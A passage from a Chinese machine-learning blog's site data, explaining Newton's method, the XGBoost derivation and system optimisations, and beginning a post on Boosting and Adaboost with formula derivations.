(w^{t+1} - w^t)L&#39;&#39;(w^{t}) \\] 令偏导为0，可得： \\[ w^{t+1} = w^{t} -\\frac{L&#39;(w^{t})}{L&#39;&#39;(w^{t})} \\] 如果扩展到高维，即\\(\\bf w\\)为向量，则 \\[ w^{t+1} = w^{t} - H^{-1}g\\hspace{5ex} H为海森矩阵，g=L&#39;(w^t) \\] 在数值分析中的做法 上面的做法是在最优化问题中的，求的是一阶导为0，即\\(f&#39;(x) = 0\\)。 而在数值分析中，想要求的是方程式的根，即\\(f(x) = 0\\)，我们只需要进行一阶展开,并令其为0，得： \\[ f(x^{t + 1}) =f(x^{t}) + f&#39;(x^{t})(x^{t+1} - x^t) = 0 \\] 于是有： \\[ x^{t + 1} = x^t -\\frac{f(x^t)}{f&#39;(x^t)} \\] 这就是迭代的公式。 如果你对这两个困惑的话，可以参考wiki百科： Newton's method Newton's method in optimization 牛顿法和梯度下降法对比 梯度下降法只利用到了目标函数的一阶偏导数信息，以负梯度方向作为搜索方向，只考虑目标函数在迭代点的局部性质。 而牛顿法不仅使用目标函数的一阶偏导数，还进一步利用了目标函数的二阶偏导数，这样就考虑了梯度变化的趋势，因而能更全面的确定合适的搜索方向以加快收敛。但牛顿法主要有一下两个缺点： 对目标函数有严格的要求，函数必须有连续的一、二阶偏导，海森矩阵必须正定。 计算相当复杂，除需计算梯度以外，还需计算二阶偏导数矩阵和它的逆矩阵，计算量和空间消耗比较大。 因此，有拟牛顿法，可以参考https://blog.csdn.net/itplus/article/details/21896453 XGBoost XGBoost其实也是GBDT的一种，等下你会发现，还是加性模型和前向优化算法。 在正式介绍之前，首先讲点别的。 在有监督学习中，可以分为：模型，参数 、目标函数和学习方法。 模型即给定输入\\(x_i\\)如何预测输出\\(y_i\\)，而这个y可以很多种形式，如回归，概率，类别、排序等 参数即比如线性回归的w 目标函数可以分为损失函数+正则 \\(Obj(\\Theta) = L(\\Theta)+\\Omega(\\Theta)\\) 损失函数：如平方误差等，告诉我们模型拟合数据的情况。 =&gt; Bias 正则项：惩罚复杂的模型，鼓励简单的模型。 =&gt; Variance 模型学习方法即解决给定目标函数后怎么学的问题。 讲这三个方面的内容是为什么呢？ 这三个方面的内容指导着XGBoost整个系统的设计！下面你可以带着这三个看看XGBoost是怎么做的！ 接下来开始XGBoost之旅~ 本小节主要是根据陈天奇大牛的博文以及PPT来进行介绍。 CART 前面讲过分类回归树CART，这里就当复习，过一遍就好。 假设要判断一个人是否喜欢电脑游戏，输入为年龄，性别职业等特征。可以得到如下的回归树： XGBoost-CART-tree 在叶子节点上会有一个分数，而这个分数我们可以做很多事情，诸如进行回归，映射成概率进行分类、排序等。 Tree ensemble 单棵CART拟合能力有限，想想我们之前的集成学习，可以使用多棵树！ 比如下图用两棵树一起进行预测，样本的预测结果就是两棵树的和： XGBoost-tree-ensemble 而“一起预测”的学习方法又分为随机森林（Random Forest）和提升树（Boosted tree）。这是不是把前面的集成学习的知识串起来了？这里，多棵树即我们的模型： \\(\\hat y_i = \\sum_{t=1}^Kf_t(x_i),\\ \\ f_t \\in\\mathcal{F}\\) 这里假设有K棵树，\\(f\\)是回归树，而\\(\\mathcal{F}\\) 对应了所有回归树组成的函数空间。 那么模型的参数是什么呢？就是树的结构，以及每个叶子节点上预测的分数。或者说就是一棵棵的树。 模型学习 那么如何学习模型呢？这个问题的通用答案就是：定义目标函数，然后去优化目标函数! 目标函数 因此，这里定义目标函数如下，并带了正则项： \\[ Obj(\\Theta) = \\sum_{i=1}^N l(y_i,\\hat y_i) +\\sum_{j=1}^t\\Omega(f_j)， \\ \\ f_j \\in\\mathcal{F} \\tag{2-1} \\] 那么，如何优化上面的目标函数？我们不能用诸如梯度下降的方法，因为\\(f\\)是树，而非数值型的向量。 这时候就要想起我们的前向分步算法，即贪心法找局部最优解： \\[ \\hat y_i^{(t)} = \\sum_{j=1}^tf_j(x_i)=\\hat y_i^{(t-1)} + f_t(x_i) \\] 因此，我们每一步找一个使得我们的损失函数降低最大的\\(f\\)（贪心法体现在这），因此我们的目标函数可以写为 \\[ \\begin{align*} Obj^{\\ (t)} &amp;= \\sum_{i=1}^N l(y_i,\\hat y_i^{(t)}) +\\sum_{j=1}^t\\Omega(f_j)\\\\ &amp;=\\sum_{i=1}^N l(y_i,\\hat y_i^{(t-1)} + f_t({\\bf x_i})) + \\Omega(f_t) + constant\\\\ &amp;= \\sum_{i=1}^N l(y_i,\\hat y_i^{(t-1)} + f_t({\\bf x_i})) + \\Omega(f_t) \\tag{2-2} \\end{align*} \\] 这里简单解释一下上式的意思，第1行的目标函数即在第t轮，每个样本的损失+t轮每棵树的正则项。而在第t轮，前面的t-1轮的正则项都相当于常数，可以不做考虑。 假设损失函数使用的是平方损失，则式2-2写为： \\[ \\begin{align*} Obj^{\\ (t)} &amp;=\\sum_{i=1}^N \\left(y_i - \\left(\\hat y_i^{(t-1)} + f_t({\\bf x_i})\\right)\\right)^2 + \\Omega(f_t) \\\\ &amp;= \\sum_{i=1}^N (\\underbrace {y_i - \\hat y_i^{(t-1)}}_{残差} - f_t({\\bf x_i}))^2 + \\Omega(f_t) \\end{align*} \\] 这就是之前我们GBDT中使用平方损失，然后每一轮拟合的残差。 更一般的，我们之前使用“负梯度”，而现在，我们采用泰勒展开来定义一个近似的目标函数： \\[ \\begin{align*} Obj^{\\ (t)} &amp;=\\sum_{i=1}^N l(y_i,\\hat y_i^{(t-1)} + f_t({\\bf x_i})) + \\Omega(f_t) \\\\ &amp;= \\sum_{i=1}^N \\left(l(y_i,\\hat y_i^{(t-1)}) + g_if_t({\\bf x_i}) + \\frac{1}{2} h_if_t^2({\\bf x_i})\\right) + \\Omega(f_t) \\hspace{5ex} \\tag{2-3}\\\\ &amp;其中，g_i=\\frac{\\partial l(y_i,\\hat y_i^{(t-1)})}{\\partial \\hat y_i^{(t-1)}},h_i=\\frac{\\partial^2l(y_i,\\hat y_i^{(t-1)})}{\\partial^2 \\hat y_i^{(t-1)}} \\end{align*} \\] 移除对当前t轮来说是常数项的\\(l(y_i,\\hat y_i^{(t-1)})\\)得到： \\[ Obj^{\\ (t)} = \\sum_{i=1}^N \\left(g_if_t({\\bf x_i}) + \\frac{1}{2} h_if_t^2({\\bf x_i})\\right) + \\Omega(f_t) \\hspace{5ex} \\tag{2-4} \\] 可以发现，2-4所示的目标函数只依赖每个数据点在误差函数上的一阶导数和二阶导数。 之所以要这么推导，是因为使得工具更一般化，陈天奇的解释原话如下: 因为这样做使得我们可以很清楚地理解整个目标是什么，并且一步一步推导出如何进行树的学习。 这一个抽象的形式对于实现机器学习工具也是非常有帮助的。传统的GBDT可能大家可以理解如优化平方残差，但是这样一个形式包含可所有可以求导的目标函数。也就是说有了这个形式，我们写出来的代码可以用来求解包括回归，分类和排序的各种问题，正式的推导可以使得机器学习的工具更加一般。 正则项 之前讨论了目标函数中训练误差的部分，接下来讨论树的复杂度定义，即正则项。 什么指标能衡量树的复杂度呢？如树的深度，内部节点个数，叶子节点个数(T)，叶节点分数(W)... XGBoost采用衡量树复杂度的方式为:一棵树里面叶子节点的个数T，以及每棵树叶子节点上面输出分数w的平方和(相当于L2正则)： \\[ \\Omega(f_t) =\\gamma T +\\frac{1}{2}\\lambda\\sum_{j=1}^{T} w_j^2 \\tag{2-5} \\] 一个例子如下： XGBoost-regularization 完整的目标函数 将2-4和2-5合起来，就是： \\[ Obj^{\\ (t)} = \\underbrace{\\sum_{i=1}^N \\left(g_if_t({\\bf x_i}) + \\frac{1}{2} h_if_t^2({\\bf x_i})\\right)}_{对样本累加} +\\gamma T +\\frac{1}{2}\\lambda \\underbrace{\\sum_{j=1}^{T} w_j^2}_{对叶结点累加} \\] 第一项是对样本的累加，而最后一项是对叶结点的累加，我们可以进行改写，将其合并起来。 定义q函数将输入x映射到某个叶节点上，则\\(f_t({\\bf x}) = w_{q({\\bf x})}\\)，此外，定义每个叶子节点j上的样本集合为\\(I_j = \\{i|q(x_i) = j\\}\\)，则目标函数可以改写为： \\[ \\begin{align*} Obj^{\\ (t)} &amp;=\\sum_{i=1}^N \\left(g_if_t({\\bf x_i}) + \\frac{1}{2} h_if_t^2({\\bf x_i})\\right) +\\gamma T +\\frac{1}{2}\\lambda \\sum_{j=1}^{T} w_j^2\\\\ &amp;=\\sum_{i=1}^N \\left(g_iw_{q({\\bf x_i})} + \\frac{1}{2} h_iw_{q({\\bf x_i})}^2\\right) +\\gamma T +\\frac{1}{2}\\lambda \\sum_{j=1}^{T} w_j^2\\\\ &amp;=\\sum_{j=1}^T \\left(\\sum_{i \\in I_j} g_iw_j+ \\frac{1}{2} \\sum_{i \\in I_j} h_i w_j^2\\right) +\\gamma T +\\frac{1}{2}\\lambda \\sum_{j=1}^{T} w_j^2\\\\ &amp;=\\sum_{j=1}^T \\left(G_jw_j + \\frac{1}{2} (H_j + \\lambda) w_j^2\\right) +\\gamma T \\tag{2-6} \\end{align*} \\] 这就得到了我们的完整的目标函数，其中，\\(G_j = \\sum_{i \\in I_j} g_i \\quad H_j = \\sum_{i \\in I_j} h_i\\) 因此，现在要做的是两件事： 确定树的结构, 这样，这一轮的目标函数就确定了下来 求使得当前这一轮(第t轮)的目标函数最小的叶结点分数w。(Obj代表了当我们指定一个树的结构的时候，我们在目标上面最多减少多少，也称为结构分数，structure score） 假设已经知道了树的结构，那么第2件事情是十分简单的，直接对w求导，使得导数为0，就得到每个叶结点的预测分数为： \\[ w_j = - \\frac{G_j}{H_j+\\lambda} \\tag{2-7} \\] 带入2-6得到最小的结构分数为： \\[ \\begin{align*} Obj^{\\ (t)} &amp;=\\sum_{j=1}^T \\left(G_jw_j + \\frac{1}{2} (H_j + \\lambda) w_j^2\\right) +\\gamma T\\\\ &amp;=\\sum_{j=1}^T \\left(- \\frac{G_j^2}{H_j+\\lambda} + \\frac{1}{2} \\frac{G_j^2}{H_j+\\lambda} \\right) +\\gamma T\\\\ &amp;=- \\frac{1}{2}\\sum_{j=1}^T \\left({\\color{red}{\\frac{G_j^2}{H_j+\\lambda}} } \\right) +\\gamma T \\tag{2-8} \\end{align*} \\] 2-8所表示的目标函数越小越好。 一个结构分数计算例子如下图： XGBoost-structure-score-calculation 树的结构确定 接下来要解决的就是上面提到的问题，即如何确定树的结构。 暴力枚举所有的树结构，然后选择结构分数最小的。 树的结构太多了，这样枚举一般不可行。 通常采用贪心法，每次尝试分裂一个叶节点，计算分裂后的增益，选增益最大的。这个方法在之前的决策树算法中大量被使用。而增益的计算方式比如ID3的信息增益，C4.5的信息增益率，CART的Gini系数等。那XGBoost呢？ 回想式子2-8标红色的部分，衡量了每个叶子节点对总体损失的贡献，我们希望目标函数越小越好，因此红色的部分越大越好。 XGBoost使用下面的公式计算增益： \\[ Gain = \\frac{1}{2}[\\underbrace{\\frac{G_L^2}{H_L+\\lambda}}_{左子树分数} + \\underbrace{\\frac{G_R^2}{H_R+\\lambda}}_{右子树分数} - \\underbrace{\\frac{(G_L+G_R)^2}{H_L+H_R+\\lambda}}_{分裂前分数}] - \\underbrace{\\gamma}_{新叶节点复杂度}\\tag{2-9} \\] 式2-9即2-8红色部分的分裂后 - 分裂前的分数。Gain值越大，说明分裂后能使目标函数减少越多，就越好。 因此，每次分裂，枚举所有可能的分裂方案，就和CART中回归树进行划分一样，要枚举所有特征和特征的取值。该算法称为Exact Greedy Algorithm，如下图所示： XGBoost-exact-greedy-algorithm-for-split-finding 假设现在枚举的是年龄特征\\(x_j\\)。现在要考虑划分点a，因此要计算枚举\\(x_j &lt; a\\) 和 \\(a\\le x_j\\)的导数和： XGBoost-find-the-best-split 可以看出，对于一个特征，对特征取值排完序后，枚举所有的分裂点a，只要从左到右扫描一遍就可以枚举出所有分割的梯度\\(G_L\\)和\\(G_R\\)，然后用式2-9计算即可。这样假设树的高度为H，特征数d，则复杂度为 \\(O(Hd n\\log n)\\)。 其中，排序为\\(O(n\\log n)\\)，每个特征都要排序所以乘以d，每一层都要这样一遍，所以乘以高度H。这个仍可以继续优化（之后再讲）。 此外需要注意的是：分裂不一定会使得情况变好，因为有一个引入新叶子的惩罚项\\(\\gamma\\)，优化这个目标相当于进行树的剪枝。当引入的分裂带来的增益小于一个阀值的时候，不进行分裂操作。 再次回到之前说的为啥这么推导： 大家可以发现，当我们正式地推导目标的时候，像计算分数和剪枝这样的策略都会自然地出现，而不再是一种因为启发式而进行的操作了（反观决策树充满着启发式）。 XGBoost 一些trick 本小节介绍XGBoost的一些trick，最后总结XGBoost快的原因。 步长 step-size 同之前的GBDT一样，XGBoost也可以加入步长\\(\\eta\\)（有的也叫收缩率Shrinkage），这也是防止过拟合的好方法： \\[ \\hat y_i^t = \\hat y_i^{(t-1)} + {\\color{red} \\eta} f_t(x_i)\\tag{3-1} \\] 通常步长 \\(\\eta\\) 取值为0.1。当然GBDT也可以采用这个。 行、列抽样 XGBoost借鉴随机森林也使用了列抽样(在每一次分裂中使用特征抽样)，进一步防止过拟合，并加速训练和预测过程。 此外，在实现中还有行抽样（样本抽样）。 树节点划分算法 - Approximate Algorithm 前面提到过，XGBoost每一步选能使分裂后增益最大的分裂点进行分裂。而分裂点的选取之前是枚举所有分割点，这称为精确的贪心法（Exact Greedy Algorithm）. 当数据量十分庞大，以致于不能全部放入内存时，Exact Greedy 算法就会很慢。因此XGBoost引入了近似的算法。 简单的说，就是根据特征k的分布来确定\\(l\\)个候选切分点\\(S_k = \\{s_{k1},s_{k2},\\cdots s_{kl}\\}\\)，然后根据这些候选切分点把相应的样本放入对应的桶中，对每个桶的\\(G,H\\)进行累加。最后在候选切分点集合上贪心查找，和Exact Greedy Algorithm类似。该算法描述如下： XGBoost-approximate-algorithm-for-split-finding 给定了候选切分点后，一个例子为： XGBoost-approximate-algorithm-for-split-finding-example 那么，现在有两个问题： 如何选取候选切分点\\(S_k = \\{s_{k1},s_{k2},\\cdots s_{kl}\\}\\)呢？ 什么时候进行候选切分点的选取？ 第1个问题在下一小节说明，先回答第2个问题。 分界点选取时机 对于问题2，XGBoost有两种策略，全局策略（Global）和局部策略(Local) Global： 学习每棵树前， 提出候选切分点 Local： 每次分裂前， 重新提出候选切分点 一个对比如下图： XGBoost-approximate-algorithm-for-split-finding-global-vs-local 桶的个数等于 1 / eps， 可以看出: 全局切分点的个数够多的时候，和Exact greedy算法性能相当。 局部切分点个数不需要那么多，因为每一次分裂都重新进行了选择。 切分点的选取 - Weighted Quantile Sketch 对于问题1，可以采用分位数，也可以直接构造梯度统计的近似直方图等。 Notably, it is also possible to directly construct approximate histograms of gradient statistics [22]. It is also possible to use other variants of binning strategies instead of quantile. 先回答一下什么是分位数，WIKI百科上是这么说的 quantiles are cut points dividing the range of a probability distribution into contiguous intervals with equal probabilities, or dividing the observations in a sample in the same way. 即把概率分布划分为连续的区间，每个区间的概率相同。 以统计学常见的四分位数为例，就是： 四分位数（Quartile）把所有数值由小到大排列并分成四等份，处于三个分割点位置的数值就是四分位数。 1）第一四分位数(Q1)，又称“较小四分位数”，等于该样本中所有数值由小到大排列后第25%的数字； 2）第二四分位数(Q2)，又称“中位数”，等于该样本中所有数值由小到大排列后第50%的数字； 3）第三四分位数(Q3)，又称“较大四分位数”，等于该样本中所有数值由小到大排列后第75%的数字。 可以看出，简单的分位数就是先把数值进行排序，然后根据你采用的几分位数把数据分为几份即可。 而XGBoost不单单是采用简单的分位数的方法，而是对分位数进行加权（使用二阶梯度h），称为：Weighted Quantile Sketch。PS:上面的那个例子采用的是没有使用二阶导加权的分位数。 对特征k构造multi-set 的数据集：\\(D_k= {(x_{1k}, h_1) , (x_{2k},h_2) , ...,(x_{nk},h_n) }\\), 其中 \\(x_{ik}\\) 表示样本i的特征k的取值，而\\(h_i\\)则为对应的二阶梯度。 可以定义一个rank function为： \\[ r_k(z) = \\frac{1}{\\sum_{(x,h) \\in D_k } h} \\sum_{(x,h) \\in D_k, x&lt;z} h\\tag{3-2} \\] 式3-2表达了第k个特征小于z的样本比例，和之前的分位数挺相似，不过这里是按照二阶梯度进行累计。而候选切分点\\(\\{s_{k1},s_{k2},\\cdots,s_{kl}\\}\\)要求： \\[ |r_k(s_{k,j})-r_k(s_{k,j+1})|&lt;\\varepsilon,\\hspace{5ex} s_{k1}= \\min_i x_{ik}, \\ s_{kl}=\\max_i x_{ik} \\] 太数学了？用大白话说就是让相邻两个候选分裂点相差不超过某个值\\(\\varepsilon\\)。因此，总共会得到\\(1/\\varepsilon\\)个切分点。 一个例子如下： XGBoost-approximate-algorithm-for-split-finding-example-with-second-gradient-weighted 要切分为3个，总和为1.8，因此第1个在0.6处，第2个在1.2处。 那么，为什么要用二阶梯度加权？将前面我们泰勒二阶展开后的目标函数2-4进行配方： \\[ \\begin{align*} &amp;\\sum_{i=1}^N\\left(g_if_t({\\bf x_i}) + \\frac{1}{2}h_if_t^2({\\bf x_i})\\right) + \\Omega(f_t)\\\\ = &amp;\\sum_{i=1}^N\\frac{1}{2}h_i\\left(2\\frac{g_i}{h_i}f_t({\\bf x_i}) + f_t^2({\\bf x_i})\\right) + \\Omega(f_t) \\\\ =&amp;\\sum_{i=1}^N \\frac{1}{2}h_i\\left(\\frac{g_i^2}{h_i^2} +2\\frac{g_i}{h_i}f_t({\\bf x_i}) + f_t^2({\\bf x_i})\\right) + \\Omega(f_t) \\\\ =&amp;\\sum_{i=1}^N \\frac{1}{2}{\\color{red}h_i}\\left( f_t({\\bf x_i}) - ({\\color{red}- \\frac{g_i}{h_i}})\\right)^2 + \\Omega(f_t) \\tag{3-3} \\end{align*} \\] 推导第三行可以加入\\(\\frac{g_i^2}{h_i^2}\\)是因为\\(g_i\\)和\\(h_i\\)是上一轮的损失函数求导，是常量。 从式3-3可以看出，就像是标签为\\(-g_i / h_i\\)，权重为\\(h_i\\)的平方损失，因此用\\(h_i\\)加权。 PS: 原论文的\\(g_i / h_i\\)符号错了，我推导的时候觉得很奇怪，查了很多介绍XGBoost的资料，都没有说明如何推导，直接把原公式一贴，这是很不好的。最后看到了Stack Exchange上的回答： The second equation should have its sign reversed, as in: \\[ \\begin{align*} &amp;\\sum_{i=1}^N\\frac{1}{2}h_i[f_t(x_i) - (-g_i/h_i)]^2 + constant\\\\ = &amp;\\sum_{i=1}^N\\frac{1}{2}h_i[f_t^2(x_i) + 2\\frac{f_t(x_i)g_i}{h_i} + (g_i/h_i)^2]\\\\ =&amp; \\sum_{i=1}^N[g_if_t(x_i) + \\frac{1}{2}h_if_t^2(x_i) + \\frac{gi^2}{2h_i}] \\end{align*} \\] The last term is indeed constant: remember that the \\(g_i\\) and \\(h_i\\) are determined by the previous iteration, so they're constant when trying to set \\(f_t\\). So, now we can claim \"this is exactly weighted squared loss with labels \\(−g_i/h_i\\) and weights \\(h_i\\) Credit goes to Yaron and Avi from my team for explaining me this. -----from Need help understanding xgboost's approximate split points proposal 稀疏值处理 - Sparsity-aware Split Finding 在真实世界中，我们的特征往往是稀疏的，可能的原因有： 数据缺失值 大量的0值（比如统计出现的） 进行了One-hot 编码 XGBoost能对缺失值自动进行处理，其思想是对于缺失值自动学习出它该被划分的方向（左子树or右子树）: XGBoost-sparsity-aware-split-finding 注意，上述的算法只遍历非缺失值。划分的方向怎么学呢？很naive但是很有效的方法： 让特征k的所有缺失值的都到右子树，然后和之前的一样，枚举划分点，计算最大的gain 让特征k的所有缺失值的都到左子树，然后和之前的一样，枚举划分点，计算最大的gain 这样最后求出最大增益的同时，也知道了缺失值的样本应该往左边还是往右边。使用了该方法，相当于比传统方法多遍历了一次，但是它只在非缺失值的样本上进行迭代，因此其复杂度与非缺失值的样本成线性关系。在Allstate-10k数据集上，比传统方法快了50倍: XGBoost-sparsity-aware-split-finding-vs-basic-algorithm 分块并行 - Column Block for Parallel Learning 在建树的过程中，最耗时是找最优的切分点，而这个过程中，最耗时的部分是将数据排序。为了减少排序的时间，提出Block结构存储数据。 Block中的数据以稀疏格式CSC进行存储 Block中的特征进行排序（不对缺失值排序） Block 中特征还需存储指向样本的索引，这样才能根据特征的值来取梯度。 一个Block中存储一个或多个特征的值 XGBoost-column-block 可以看出，只需在建树前排序一次，后面节点分裂时可以直接根据索引得到梯度信息。 在Exact greedy算法中，将整个数据集存放在一个Block中。这样，复杂度从原来的\\(O(H d||x||_0\\log n)\\)降为\\(O(Hd||x||_0+||x||_0\\log n)\\)，其中\\(||x||_0\\)为训练集中非缺失值的个数。这样，Exact greedy算法就省去了每一步中的排序开销。 在近似算法中，使用多个Block，每个Block对应原来数据的子集。不同的Block可以在不同的机器上计算。该方法对Local策略尤其有效，因为Local策略每次分支都重新生成候选切分点。 Block结构还有其它好处，数据按列存储，可以同时访问所有的列，很容易实现并行的寻找分裂点算法。此外也可以方便实现之后要讲的out-of score计算。 缺点是空间消耗大了一倍。 缓存优化 - Cache-aware Access 使用Block结构的一个缺点是取梯度的时候，是通过索引来获取的，而这些梯度的获取顺序是按照特征的大小顺序的。这将导致非连续的内存访问，可能使得CPU cache缓存命中率低，从而影响算法效率。 XGBoost-cache-missing 因此，对于exact greedy算法中, 使用缓存预取。具体来说，对每个线程分配一个连续的buffer，读取梯度信息并存入Buffer中（这样就实现了非连续到连续的转化），然后再统计梯度信息。该方式在训练样本数大的时候特别有用，见下图： XGBoost-cache-aware-access-exact-greedy 在approximate 算法中，对Block的大小进行了合理的设置。定义Block的大小为Block中最多的样本数。设置合适的大小是很重要的，设置过大则容易导致命中率低，过小则容易导致并行化效率不高。经过实验，发现2^16比较好。 XGBoost-cache-aware-access-approximate-algorithm Blocks for Out-of-core Computation 当数据量太大不能全部放入主内存的时候，为了使得out-of-core计算称为可能，将数据划分为多个Block并存放在磁盘上。 计算的时候，使用独立的线程预先将Block放入主内存，因此可以在计算的同时读取磁盘 Block压缩，貌似采用的是近些年性能出色的LZ4 压缩算法，按列进行压缩，读取的时候用另外的线程解压。对于行索引，只保存第一个索引值，然后用16位的整数保存与该block第一个索引的差值。 Block Sharding， 将数据划分到不同硬盘上，提高磁盘吞吐率 总结 读到这里，相信你对XGBoost已经很有了解。下面总结几个问题： XGBoost为什么快 当数据集大的时候使用近似算法 Block与并行 CPU cache 命中优化 Block预取、Block压缩、Block Sharding等 XGBoost与传统GBDT的不同 这里主要参考weapon的回答，答案在：机器学习算法中GBDT和XGBOOST的区别有哪些？ 传统GBDT以CART作为基分类器，XGBoost还支持线性分类器，这个时候XGBoost相当于带L1和L2正则化项的Logistic回归（分类问题）或者线性回归（回归问题）。 传统的GBDT只用了一阶导数信息（使用牛顿法的除外），而XGBoost对损失函数做了二阶泰勒展开。并且XGBoost支持自定义损失函数，只要损失函数一阶、二阶可导。 XGBoost的目标函数多了正则项， 相当于预剪枝，使得学习出来的模型更加不容易过拟合。 XGBoost还有列抽样，进一步防止过拟合。 对缺失值的处理。对于特征的值有缺失的样本，XGBoost可以自动学习出它的分裂方向。 XGBoost工具支持并行。当然这个并行是在特征的粒度上，而非tree粒度，因为本质还是boosting算法。 XGBoost Scalable的体现 XGBoost的paper在KKD上发表，名为：《Xgboost: A scalable tree boosting system》，那么scalable体现在哪? 参考知乎上王浩的回答，修改如下： 模型的scalability：弱分类器可以支持cart也可以支持lr和linear， 但其实这是Boosting算法做的事情，XGBoost只是实现了而已。 目标函数的scalability： 支持不同的loss function, 支持自定义loss function，只要一、二阶可导。有这个特性是因为泰勒二阶展开，得到通用的目标函数形式。 学习方法的scalability：Block结构支持并行化，支持 Out-of-core计算（这点和王浩的看法不一样，他写的是优化的trick） XGBoost 防止过拟合的方法 目标函数的正则项， 叶子节点数+叶子节点数输出分数的平方和 \\(\\Omega(f_t) =\\gamma T +\\frac{1}{2}\\lambda\\sum_{j=1}^{T} w_j^2\\) 行抽样和列抽样：训练的时候只用一部分样本和一部分特征 可以设置树的最大深度 \\(\\eta\\): 可以叫学习率、步长或者shrinkage Early stopping：使用的模型不一定是最终的ensemble，可以根据测试集的测试情况，选择使用前若干棵树 参考资料 Chen, Tianqi, and Carlos Guestrin. “Xgboost: A scalable tree boosting system.” Proceedings of the 22nd acm sigkdd international conference on knowledge discovery and data mining. ACM, 2016. XGBoost 与 Boosted Tree - 陈天奇 GBDT算法原理与系统设计简介 - weapon GBDT详解 - 火光摇曳 XGBoost解读(2)–近似分割算法 XGboost核心源码阅读 XGboost - github","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』集成学习（二）Boosting与GBDT","slug":"machine-learning-model-ensemble-boostring-and-gbdt","date":"2018-05-10T11:17:08.000Z","updated":"2020-10-21T15:22:50.227Z","comments":true,"path":"machine-learning-model-ensemble-boostring-and-gbdt/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-model-ensemble-boostring-and-gbdt/","excerpt":"在上一章节中，我们介绍了模型融合以及Bagging方法，本文主要介绍Boosting相关方法。包括： Boosting Adaboost GBDT","text":"在上一章节中，我们介绍了模型融合以及Bagging方法，本文主要介绍Boosting相关方法。包括： Boosting Adaboost GBDT Boosting Boosting也叫提升法，是一类将弱学习器提升为强学习器的算法。 这类算法的工作机制类似：先从初始训练集中训练出一个基学习器，再根据学习器的表现对训练样本分布进行调整，使得先前基学习器做错的样本在后续受到更多的关注，然后基于调整后的样本分布来训练下一个基学习器；如此重复进行，直到基学习器数目达到事先指定的T，最终将T个基学习器进行加权结合。 Adaboost 首先给出Adaboost的算法： 输入: 训练集 \\(Data =\\{({\\bf x_1},y_1),({\\bf x_2},y_2),\\cdots,({\\bf x_N},y_N)\\}, y_i \\in\\{+1, -1\\}\\); ​ 训练轮数T， ​ 训练算法G 过程： ​ 初始化样本权重 \\(D_{1,i} = \\frac{1}{N}, i=1,2,\\cdots,N\\) ​ for t = 1 to T do ​ \\(h_t = G({\\rm Data} , D_t)\\) # 用训练算法G基于权重\\(D_t\\)训练出当前的分类器\\(h_t\\) ​ \\(\\epsilon_t = \\sum_{i=1}^N D_{t,i}I(h_t(x_i) \\ne y_i)\\) # 计算误差 ​ if \\(\\epsilon_t &gt; 0.5\\) then break ​ \\(\\alpha_t = \\frac{1}{2}\\ln(\\frac{1 - \\epsilon_t }{\\epsilon_t})\\) #计算分类器\\(h_t\\)的权重 ​ \\(D_{t+1,i} = \\frac{1}{Z_t}\\left( D_{t,i} \\cdot exp(-y_i\\alpha_th_t({\\bf x_i}))\\right)\\) # 更新样本权重，其中，归一化因子：\\(Z_t = {\\sum_{i=1}^N D_{t,i}}\\cdot exp\\left(-y_i\\alpha_th_t({\\bf x_i}) \\right)\\) 输出： ​ \\(H({\\bf x}) = sign(\\sum_{t=1}^T \\alpha_t h_t({\\bf x}))\\) 一张直观的图如下： adboost 描述起来好像很容易的样子： 初始化每个样本权值均等，都为1 / N 然后迭代T轮，在每一轮中学习中根据错误率\\(\\epsilon_t\\)改变训练数据的权值分布，增加分类错误的权重，减少分类正确的样本权重。这样，新一轮的学习中将会更加重视对之前分错的样本。 将T轮得到的T个分类器\\(h_t({\\bf x})\\)和对应的分类器权重\\(\\alpha_t\\)进行线性组合，就得到最终结果\\(H({\\bf x}) = sign(\\sum_{t=1}^T \\alpha_t h_t({\\bf x}))\\) 注意到当错误率\\(\\epsilon \\gt 0.5\\)的时候，我们不再计算。因为对于二分类问题，错误率大于一半意味着不如随机乱猜，留之无用。 Adaboost模型让人困惑的地方有两个： 分类器权重\\(\\alpha_t\\)为啥等于\\(\\frac{1}{2}ln(\\frac{1 - \\epsilon_t }{\\epsilon_t})\\) 样本权重公式和归一化因子是怎么来的？ 分类器权重的由来 Adaboost的分类器权重公式为：\\(\\alpha_t = \\frac{1}{2}ln(\\frac{1 - \\epsilon_t }{\\epsilon_t})\\) ，这是怎么来的呢？ 可以从最小化训练误差界来推导，也可以从最小化损失函数进行推导。这两种本质上是一样的，都是极小化某式得到的\\(\\alpha_t\\)。 这里采用最小化训练误差界来推导。 训练误差界 Adaboost的训练误差界为： \\[ \\frac{1}{N}\\sum_{i=1}^N I \\left(H({\\bf x_i}) \\ne y_i \\right) \\le \\frac{1}{N}\\sum_{i=1}^N exp(-y_if({\\bf x_i})) = \\prod_{t}Z_t \\tag{2-1} \\] 其中\\(f({\\bf x}) = \\sum_t \\alpha_th_t({\\bf x})； H({\\bf x}) = \\rm sign(f({\\bf x}))\\) 好像很复杂，我们先来不管最后那个等式，只看前面的不等式，就是说指数损失是0-1损失函数的上界。这个很好证明，当\\(H({\\bf x_i}) \\ne y_i\\)时，\\(-y_if({\\bf x_i})&lt; 0 \\Rightarrow exp(-y_if({\\bf x_i})) \\ge 1\\)。 在证明右边的等式之前，我们先回顾一下权重的定义： \\[ \\begin{align*} &amp; D_{t+1,i} = \\frac{D_{t,i}}{Z_t}\\cdot \\exp(-y_i\\alpha_th_t({\\bf x_i})) \\\\ \\Rightarrow \\ &amp; Z_tD_{t+1,i} = D_{t,i}\\cdot \\exp(-y_i\\alpha_th_t({\\bf x_i})) \\tag{2-2} \\end{align*} \\] 现推导如下： \\[ \\begin{align*} \\frac{1}{N}\\sum_{i=1}^N \\exp(-y_if({\\bf x_i})) &amp;= \\frac{1}{N}\\sum_{i=1}^N \\exp\\left (\\sum_{t=1}^T-y_i\\alpha_th_t({\\bf x})\\right) \\\\&amp; =\\sum_{i=1}^N D_{1,i} \\prod_{t=1}^{T} \\exp\\left (-y_i\\alpha_th_t({\\bf x})\\right) \\hspace{5ex} D_{1,i}= \\frac{1}{N} \\\\&amp; 